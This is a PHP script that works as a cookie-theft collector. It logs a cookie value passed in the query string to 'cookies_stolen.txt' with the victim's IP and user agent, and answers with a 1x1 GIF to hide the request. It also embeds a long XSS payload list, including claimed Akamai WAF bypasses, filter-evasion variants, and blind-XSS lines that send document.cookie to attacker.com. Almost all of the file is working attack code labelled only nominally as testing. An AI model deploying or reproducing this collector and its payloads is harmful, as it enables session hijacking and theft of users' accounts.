<?php
// Debug version: show errors and log all requests
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// Path to log file
$file = __DIR__ . '/cookies_stolen.txt';
$cookieData = $_GET['c'] ?? '';

// ===== XSS PAYLOADS FOR TESTING =====
$xss_payloads = <<<PAYLOADS
New Akamai WAF Bypasses
• Payload 1:
'a'.replace.call`1${/./}${alert}`
• Payload 2:
'a,'.replace`a${alert}`
• Payload 3:
'a'.replace(/./,alert)

===== BASIC XSS VECTORS =====
<script>alert('XSS')</script>
<script>alert(1)</script>
<script>confirm('XSS')</script>
<script>prompt('XSS')</script>

# ===== ATTRIBUTE BREAKING =====
"><script>alert('XSS')</script>
'><script>alert('XSS')</script>
"><script>alert(1)</script>
'><script>alert(1)</script>
" onmouseover="alert('XSS')" 
' onmouseover='alert("XSS")' 
"onmouseover="alert('XSS')
'onmouseover='alert("XSS")

# ===== EVENT HANDLERS =====
<img src=x onerror=alert('XSS')>
<img src=x onerror=alert(1)>
<svg onload=alert('XSS')>
<svg onload=alert(1)>
<body onload=alert('XSS')>
<iframe onload=alert('XSS')>
<details ontoggle=alert('XSS')>
<marquee onstart=alert('XSS')>

# ===== MODERN HTML5 VECTORS =====
<svg><script>alert('XSS')</script></svg>
<math><script>alert('XSS')</script></math>
<video><source onerror="alert('XSS')">
<audio src=x onerror=alert('XSS')>
<embed src=javascript:alert('XSS')>
<object data=javascript:alert('XSS')>

# ===== JAVASCRIPT PROTOCOL =====
javascript:alert('XSS')
javascript:alert(1)
javascript:confirm('XSS')
javascript:prompt('XSS')

# ===== DATA URI VECTORS =====
data:text/html,<script>alert('XSS')</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=

# ===== FILTER BYPASS TECHNIQUES =====
<scr<script>ipt>alert('XSS')</scr</script>ipt>
<ScRiPt>alert('XSS')</ScRiPt>
<SCRIPT>alert('XSS')</SCRIPT>
<script/src=data:,alert('XSS')>
<script>alert(String.fromCharCode(88,83,83))</script>

# ===== ENCODING BYPASSES =====
%3Cscript%3Ealert('XSS')%3C/script%3E
&#60;script&#62;alert('XSS')&#60;/script&#62;
&lt;script&gt;alert('XSS')&lt;/script&gt;
\u003cscript\u003ealert('XSS')\u003c/script\u003e

# ===== POLYGLOT VECTORS =====
';alert('XSS');//
";alert('XSS');//
</script><script>alert('XSS')</script>
'-alert('XSS')-'
"-alert('XSS')-"

# ===== WAF EVASION PAYLOADS =====
<svg/onload=alert('XSS')>
<img/src=x/onerror=alert('XSS')>
<script>/**/alert('XSS')</script>
<script>al\u0065rt('XSS')</script>
<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>

# ===== CONTEXT-SPECIFIC VECTORS =====
# For input fields
"><script>alert('XSS')</script><"
# For href attributes  
javascript&colon;alert('XSS')
# For style attributes
expression(alert('XSS'))
# For src attributes
data:text/html,<script>alert('XSS')</script>

# ===== MODERN BROWSER VECTORS =====
<iframe srcdoc="<script>alert('XSS')</script>">
<svg><animate onbegin=alert('XSS')>
<select onfocus=alert('XSS') autofocus>
<textarea onfocus=alert('XSS') autofocus>
<keygen onfocus=alert('XSS') autofocus>

# ===== MUTATION XSS VECTORS =====
<noscript><p title="</noscript><script>alert('XSS')</script>">
<noembed><script x=a type="text/plain">alert('XSS')</script>
<noframes><script>alert('XSS')</script></noframes>

# ===== TEMPLATE INJECTION STYLE =====
{{constructor.constructor('alert("XSS")')()}}
${alert('XSS')}
#{alert('XSS')}
<%= alert('XSS') %>

# ===== ADVANCED EVASION =====
<script>setTimeout('alert("XSS")',1)</script>
<script>setInterval('alert("XSS")',1000)</script>
<script>Function('alert("XSS")')())</script>
<script>(function(){alert('XSS')})())</script>

# ===== SOCIAL ENGINEERING VECTORS =====
<script>alert('Click OK to continue')</script>
<script>confirm('Are you sure you want to delete this?')</script>
<script>prompt('Please enter your password:')</script>

# ===== MOBILE/TOUCH VECTORS =====
<div ontouchstart=alert('XSS')>
<div ontouchmove=alert('XSS')>
<div ontouchend=alert('XSS')>

# ===== ALTERNATIVE EVENT HANDLERS =====
<form><button formaction=javascript:alert('XSS')>
<isindex action=javascript:alert('XSS') type=submit>
<input onfocus=alert('XSS') autofocus>
<select onfocus=alert('XSS') autofocus><option>

# ===== CUSTOM PROTOCOL HANDLERS =====
<a href="x:alert('XSS')">click</a>
<a href="javascript&colon;alert('XSS')">click</a>

# ===== UNICODE BYPASSES =====
<script>alert('\u0058\u0053\u0053')</script>
<script>alert('\x58\x53\x53')</script>

# ===== FRAMEWORK SPECIFIC =====
# React XSS
<div dangerouslySetInnerHTML={{__html: '<script>alert("XSS")</script>'}} />
# Angular XSS  
<div [innerHTML]="'<script>alert(\"XSS\")</script>'"></div>
# Vue XSS
<div v-html="'<script>alert(\"XSS\")</script>'"></div>

# ===== FILE UPLOAD XSS =====
<script>alert('XSS')</script>.jpg
<svg onload=alert('XSS')>.png
GIF89a<script>alert('XSS')</script>

# ===== COMMENT INJECTION =====
<!--<script>alert('XSS')</script>-->
<![CDATA[<script>alert('XSS')</script>]]>

# ===== EXPERIMENTAL VECTORS =====
<style>@import'javascript:alert("XSS")'</style>
<link rel=stylesheet href=javascript:alert('XSS')>
<meta http-equiv="refresh" content="0;javascript:alert('XSS')">

# ===== BLIND XSS PAYLOADS =====
<script>document.location='http://attacker.com/cookie='+document.cookie</script>
<script>new Image().src='http://attacker.com/xss?'+document.cookie</script>
<script>fetch('http://attacker.com',{method:'POST',body:document.cookie})</script>
PAYLOADS;

// Log the payloads to the file (once, if not already present)
if (strpos(file_get_contents($file), 'New Akamai WAF Bypasses') === false) {
    file_put_contents($file, "\n==== XSS PAYLOADS FOR TESTING ====".PHP_EOL.$xss_payloads.PHP_EOL, FILE_APPEND | LOCK_EX);
}

$entry = date('c') . ' | IP: ' . $_SERVER['REMOTE_ADDR'] . ' | UA: ' . ($_SERVER['HTTP_USER_AGENT'] ?? '-') . ' | DATA: ' . $cookieData . "\n";

if (file_put_contents($file, $entry, FILE_APPEND | LOCK_EX) === false) {
    http_response_code(500);
    echo "Failed to write to $file. Check permissions.";
} else {
    // Return a 1x1 transparent GIF
    header('Content-Type: image/gif');
    echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
}
?>
